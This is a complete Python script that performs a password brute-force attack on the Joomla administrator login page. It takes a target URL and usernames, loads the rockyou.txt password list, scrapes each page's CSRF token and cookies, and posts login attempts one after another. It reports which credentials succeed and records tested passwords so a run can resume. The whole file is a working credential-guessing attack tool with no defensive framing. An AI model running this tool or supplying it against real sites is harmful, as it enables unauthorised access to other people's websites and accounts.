#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

import sys


print("loading passwords")
passwords = open("./rockyou.txt", "rb").readlines()
print(passwords[:3])
print("loaded")


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')

        #optional
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
        #these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='One single username')
        group.add_argument('-U', '--userlist', type=str, help='Username list')

        args = parser.parse_args()

        #parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
        else:
            self.proxy=None

        #determine if verbose or not
        if args.verbose:
            self.verbose=True
        else:
            self.verbose=False

        #http:/site/administrator
        self.url = args.url+'/administrator/index.php'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        #Need cookie
        print(f"getting cookies at: {self.url}")
        self.cookies = None
        while not self.cookies:
            try:
                self.cookies = requests.session().get(self.url, timeout=3).cookies.get_dict()
            except KeyboardInterrupt:
                sys.exit(0)

                
            except:
                print("timeout...")
        #Wordlist from args
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist

    def sendrequest(self):
        if self.userlist:
            for user in Joomla.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()

    def doGET(self):
        import os

        tested = []
        if os.path.isfile("tested-pws.txt"):
            tested = [f.replace("\n", "") for f in open("tested-pws.txt", "r").readlines()]

        for password in passwords:
            if len(password) == 0:
                continue

            password = password.decode('utf-8').replace('\n', '')
            if password in tested:
                print(f"{bcolors.WARNING} skipping already tested.{password}")
                continue


            #Custom user-agent :)
            headers = {
                'User-Agent': 'nano'
            }

            #First GET for CSSRF
            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')

            data = {
                'username' : self.username,
                'passwd' : password,
                'option' : self.option,
                'task' : self.task,
                'return' : self.ret,
                longstring : 1
            }

            r = None
            while not r:
                try:
                    r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers, timeout=5)
                except KeyboardInterrupt:
                    return
                except:
                    print("timeout...")

            # print(r.text)
            soup = BeautifulSoup(r.text, 'html.parser')
            # response = soup.find('div', {'class': 'alert-wrapper'})
            response = soup.find('div', {'class': 'login_message'})
            # response = respose or response_login
            if response:
                print(f'{bcolors.FAIL} {self.username}:{password}({response.text.strip()}){bcolors.ENDC}')
            else:
                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')

            open("tested-pws.txt", "a").write(f"{password}\n")

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            return f.readlines()


joomla = Joomla()
